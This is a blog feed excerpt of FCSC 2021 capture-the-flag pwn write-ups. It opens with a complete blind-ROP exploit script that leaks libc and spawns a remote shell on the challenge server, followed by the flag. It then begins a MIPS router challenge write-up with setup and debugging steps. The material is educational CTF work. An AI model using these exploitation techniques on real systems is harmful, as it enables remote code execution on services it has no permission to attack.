<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span><span class="p">,</span> <span class="mi">4008</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">padd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">is_crash</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="ow">not</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">is_stop</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">ip</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">STOP_GADGETS</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">jmp</span><span class="p">(</span><span class="n">av</span><span class="p">):</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">av</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">5.0</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] sending: </span><span class="si">{</span><span class="n">padding</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">jmp</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">while</span> <span class="sa">b</span><span class="s2">&#34;Hello you.</span><span class="se">\n</span><span class="s2">What is your name ?</span><span class="se">\n</span><span class="s2">&gt;&gt;&gt; Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">padding</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># minus one char because we do not want that padding overwrite the return address</span>

<span class="k">def</span> <span class="nf">leak2</span><span class="p">(</span><span class="n">padding</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">leak1</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">leak1</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padd</span><span class="p">(</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
                <span class="n">leak2</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">leak1</span><span class="o">=</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">leak1</span>

    <span class="k">return</span> <span class="n">leak1</span>

<span class="k">def</span> <span class="nf">leak2_opti</span><span class="p">(</span><span class="n">padding</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x2000</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">continue</span>

    <span class="k">return</span> <span class="n">leak1</span>

<span class="k">def</span> <span class="nf">find_brop</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">35</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;_ - </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">base</span> <span class="o">+</span> <span class="n">i</span>

<span class="k">def</span> <span class="nf">dump_binary</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">base</span><span class="p">):</span>
    <span class="n">gadget_leak</span> <span class="o">=</span> <span class="mh">0x400510</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> 
    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>

    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>

    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;leet_dump.bin&#34;</span><span class="p">,</span> <span class="s2">&#34;ab&#34;</span><span class="p">)</span>

    <span class="k">while</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x400fff</span><span class="p">:</span>
        <span class="n">resp1</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget_leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span>
            <span class="k">continue</span>

        <span class="n">leak</span> <span class="o">=</span> <span class="n">resp1</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span><span class="n">resp1</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)]</span>
        
        <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">):</span>
            <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: 0x00&#34;</span><span class="p">)</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">buf</span> <span class="o">+=</span> <span class="n">leak</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">leak</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mh">0x100</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
            <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Buffering ..&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">find_plt</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span> 
    <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span> 

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">):</span>
        <span class="n">resp1</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span> 

        <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp1</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

        <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Out: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">try_jmp_flow</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span><span class="p">,</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">flow</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">av</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">FFLUSH_GOT</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">GADGET_LEAK</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span> <span class="o">+</span> <span class="mh">0x656</span><span class="p">)</span> <span class="c1"># ret2main</span>

    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
    <span class="n">resp_tmp</span><span class="p">,</span> <span class="n">io</span> <span class="o">=</span> <span class="n">try_jmp_flow</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">)</span>
    <span class="n">leak_fflush</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span><span class="n">resp_tmp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is&#39;</span><span class="p">)],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>

    <span class="n">libc</span> <span class="o">=</span> <span class="n">leak_fflush</span> <span class="o">-</span> <span class="n">FFLUSH_OFFSET</span> 
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">av</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">OFFT_BINSH</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">SYSTEM</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">flow</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
<span class="c1"># FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}</span>
</code></pre></div><p>Thanks to the creator of this very interesting challenge !</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/FCSC" term="FCSC" label="FCSC" />
                             
                                <category scheme="https://nasm.re/tags/Blind-Date" term="Blind-Date" label="Blind Date" />
                             
                                <category scheme="https://nasm.re/tags/n4sm" term="n4sm" label="n4sm" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[FCSC 2021 - pwn] Itsy Mipsy router]]></title>
            <link href="https://nasm.re/posts/mipsy/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/mipsy/</id>
            
            <published>2021-05-03T00:00:00+00:00</published>
            <updated>2021-05-03T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="itsy-mipsy-router-200-pts">
        Itsy Mipsy Router (200 pts)
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#itsy-mipsy-router-200-pts" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Itsy Mipsy Router (200 pts)" href="#itsy-mipsy-router-200-pts">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>Itsy Mipsy Router is a pwn challenge I did during the <a
  class="gblog-markdown__link"
  href="https://www.france-cybersecurity-challenge.fr"
  
  >FCSC event</a
>.
It&rsquo;s not a very hard challenge but I found it very interesting because it was my first mips pwn challenge !</p>
<div class="gblog-post__anchorwrap">
    <h2 id="setup">
        Setup
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#setup" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Setup" href="#setup">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>So basically we got this:</p>
<blockquote>
<p>On vous demander d&rsquo;auditer un routeur à l&rsquo;interface entre Internet et un réseau interne d&rsquo;une entreprise. Le client vous demande si il est possible de lire les fichiers stockés sur la machine filer qui sert de serveur de fichiers HTTP.
nc challenges2.france-cybersecurity-challenge.fr 4005</p>
</blockquote>
<p>And for debugging purposes administrators provided a Docker file:</p>
<pre tabindex="0"><code>FROM debian:buster-slim
RUN apt update
RUN apt install -yq socat qemu-user libc6-mips64-cross
RUN apt clean
RUN rm -rf /var/lib/apt/lists/

WORKDIR /app
COPY ./mipsy ./
RUN rm /etc/ld.so.cache

EXPOSE 4000
EXPOSE 1234
CMD socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy&quot;
</code></pre><p>So because it&rsquo;s not very convenient to debug it from the docker I tried to run it directly on my host with a gdb stub on port 5445. I setup my host by installing the right packages, deleting <code>/etc/ld.so.cache</code> and by the socat command on port 4000:</p>
<pre tabindex="0"><code>$ uname -a
Linux off 5.8.0-50-generic #56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
$ sudo apt install socat qemu-user libc6-mips64-cross
Lecture des listes de paquets... Fait
Construction de l'arbre des dépendances       
Lecture des informations d'état... Fait
socat est déjà la version la plus récente (1.7.3.3-2).
libc6-mips64-cross est déjà la version la plus récente (2.30-0ubuntu2cross2).
qemu-user est déjà la version la plus récente (1:4.2-3ubuntu6.15).
0 mis à jour, 0 nouvellement installés, 0 à enlever et 17 non mis à jour.
$ sudo rm -f /etc/ld.so.cache
$ socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy&quot;
</code></pre><p>We can debug the running process with gdb-multiarch (with the path of my pwndbg&rsquo;s gdbinit to get an cleaner output).</p>
<pre tabindex="0"><code>$ gdb-multiarch -ex 'source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py' -q ./mipsy
Reading symbols from ./mipsy...
(No debugging symbols found in ./mipsy)
pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg&gt; target remote localhost:5445

</code></pre><p>To send the payload  I used <a
  class="gblog-markdown__link"
  href="https://github.com/Gallopsled/pwntools"
  
  >pwntools</a
>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="c1"># return remote(&#34;challenges2.france-cybersecurity-challenge.fr&#34;, 4005)</span>
    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;] &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</code></pre></div><p>Now we launch the python script to trigger the socat:</p>
<pre tabindex="0"><code>$ python3 wu.py                                                               
[+] Opening connection to localhost on port 4000: Done
</code></pre><p>It does not return anything because it breaks in the shared libraries I guess, so now we can continue the execution in gdb:</p>
<pre tabindex="0"><code>Remote debugging using localhost:5445
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
0x00000040008038d0 in ?? ()
Could not check ASLR: Couldn't get personality
Downloading '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy' from the remote server: OK
